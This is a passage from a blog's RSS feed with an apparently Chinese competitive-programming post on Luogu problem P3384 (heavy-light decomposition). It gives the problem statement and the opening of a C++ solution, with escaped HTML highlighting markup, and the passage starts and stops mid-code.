&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(rt,i)&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2018/02/22/%E6%B4%9B%E8%B0%B7P3384%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86/</guid>
            <title>洛谷:P3384 【模板】树链剖分</title>
            <link>http://cubicy.icu/2018/02/22/%E6%B4%9B%E8%B0%B7P3384%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86/</link>
            <category>数链剖分</category>
            <pubDate>Thu, 22 Feb 2018 00:08:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;原题地址:&lt;a href=&#34;//www.luogu.org/problemnew/show/P3384&#34;&gt;https://www.luogu.org/problemnew/show/P3384&lt;/a&gt;  &lt;/p&gt;
&lt;h3 id=&#34;题目简述&#34;&gt;&lt;a href=&#34;#题目简述&#34; class=&#34;headerlink&#34; title=&#34;题目简述&#34;&gt;&lt;/a&gt;题目简述&lt;/h3&gt;&lt;p&gt;已知一棵包含N个结点的树（连通且无环），每个节点上包含一个数值，需要支持以下操作：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;格式： 1 x y z 表示将树从x到y结点最短路径上所有节点的值都加上z  &lt;/li&gt;
&lt;li&gt;格式： 2 x y 表示求树从x到y结点最短路径上所有节点的值之和  &lt;/li&gt;
&lt;li&gt;格式： 3 x z 表示将以x为根节点的子树内所有节点值都加上z  &lt;/li&gt;
&lt;li&gt;格式： 4 x 表示求以x为根节点的子树内所有节点值之和&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h3 id=&#34;思路&#34;&gt;&lt;a href=&#34;#思路&#34; class=&#34;headerlink&#34; title=&#34;思路&#34;&gt;&lt;/a&gt;思路&lt;/h3&gt;&lt;p&gt;树链剖分裸题。做题时看到与四种操作中的任何一种极为相似的操作，就应该立刻想到树链剖分（并且考虑是否结合线段树解答）。&lt;br&gt;关于树链剖分的介绍请看此处：&lt;a href=&#34;//www.cnblogs.com/yyy2015c01/p/8457795.html&#34;&gt;信息学竞赛相关优秀文章合集&lt;/a&gt;  &lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;代码&#34;&gt;&lt;a href=&#34;#代码&#34; class=&#34;headerlink&#34; title=&#34;代码&#34;&gt;&lt;/a&gt;代码&lt;/h3&gt;&lt;p&gt;具体介绍在注释里。&lt;br&gt;来源：洛谷用户&lt;a href=&#34;//www.luogu.org/space/show?uid=47062&#34;&gt;@zengqinyi&lt;/a&gt;  &lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;187&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;188&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;189&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;190&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;191&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;193&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;194&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;195&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;196&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;197&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;198&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;199&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;200&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;201&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;202&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;203&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;204&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;205&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;cstdlib&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; Rint register int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; mem(a,b) memset(a,(b),sizeof(a))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; Temp template&lt;span class=&#34;string&#34;&gt;&amp;lt;typename T&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; LL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;Temp &lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(T &amp;amp;x)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;T w=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,ch=&lt;span class=&#34;built_in&#34;&gt;getchar&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(!&lt;span class=&#34;built_in&#34;&gt;isdigit&lt;/span&gt;(ch)&amp;amp;&amp;amp;ch!=&lt;span class=&#34;string&#34;&gt;&amp;#x27;-&amp;#x27;&lt;/span&gt;)ch=&lt;span class=&#34;built_in&#34;&gt;getchar&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(ch==&lt;span class=&#34;string&#34;&gt;&amp;#x27;-&amp;#x27;&lt;/span&gt;)w=&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;,ch=&lt;span class=&#34;built_in&#34;&gt;getchar&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;isdigit&lt;/span&gt;(ch))x=(x&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)+(x&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)+(ch^&lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;),ch=&lt;span class=&#34;built_in&#34;&gt;getchar&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x=x*w;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; mid ((l+r)&amp;gt;&amp;gt;1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; lson rt&amp;lt;&amp;lt;1,l,mid&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; rson rt&amp;lt;&amp;lt;1|1,mid+1,r&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; len (r-l+1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; maxn=&lt;span class=&#34;number&#34;&gt;200000&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; n,m,r,mod;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//见题意 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; e,beg[maxn],nex[maxn],to[maxn],w[maxn],wt[maxn];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//链式前向星数组，w[]、wt[]初始点权数组 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a[maxn&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;],laz[maxn&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//线段树数组、lazy操作 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; son[maxn],id[maxn],fa[maxn],cnt,dep[maxn],siz[maxn],top[maxn]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//son[]重儿子编号,id[]新编号,fa[]父亲节点,cnt dfs_clock/dfs序,dep[]深度,siz[]子树大小,top[]当前链顶端节点 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; res=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//查询答案 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y)&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//链式前向星加边 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    to[++e]=y;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nex[e]=beg[x];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    beg[x]=e;&lt;/span&gt;&lt;br&gt;&lt;span 